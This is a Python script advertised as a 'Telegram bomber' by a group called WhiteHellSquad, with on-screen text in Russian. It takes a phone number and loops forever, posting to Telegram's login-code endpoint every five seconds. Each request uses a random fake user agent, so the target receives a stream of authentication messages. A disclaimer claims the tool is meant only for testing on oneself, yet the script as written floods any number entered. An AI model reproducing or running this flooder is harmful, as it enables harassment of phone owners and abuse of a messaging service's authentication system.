import requests, time
import fake_useragent
from colorama import *

user = fake_useragent.UserAgent().random
headers1 = {'user_agent': user}

print(Fore.GREEN)
print("TELEGRAM BOMBER BY WhiteHellSquad")
print("t.me/whitehellsquad")
print("t.me/whitehellsquad")
print("t.me/whitehellsquad")
print(Fore.YELLOW)
print("АВТОР ДАННОЙ УТИЛИТЫ НЕ НЕСЕТ ОТВЕСТВЕННОСТЬ ЗА ВАШИ ПРОДЕЛКИ. ДАННАЯ УТИЛИТА СОЗДАНА ЛИШЬ ДЛЯ ТЕСТА НА СЕБЕ! СПАСИБО ЗА ПОНИМАНИЕ")
print(Fore.GREEN)
print("Подождите 10 секунд.")
time.sleep(10)

print(Fore.YELLOW)
num = input("Введите номер телефона (без +): ")

print(Fore.GREEN)
print("АТАКА НАЧАТА. НАЖМИТЕ CTRL + C ДЛЯ ОСТАНОВКИ АТАКИ.")
print("Если сообщения БОЛЬШЕ НЕ ПРИХОДЯТ, не мучайте создателя!!! Сам телеграм, если идет много раз запрос, перестает отправлять сообщения!")
print("Интервал между сообщениями = 5 секунд.")

while True:
  user = fake_useragent.UserAgent().random
  headers1 = {'user_agent': user}

  try:
    a = requests.post("https://my.telegram.org/auth/send_password", {
    "phone": '+' + num}, headers=headers1, timeout=5.05)
    print(Fore.GREEN)
    print("Сообщение от Telegram отправлено!")
  except:
    print(Fore.RED)
    print("Сообщение от Telegram не отправлено.")
  time.sleep(5)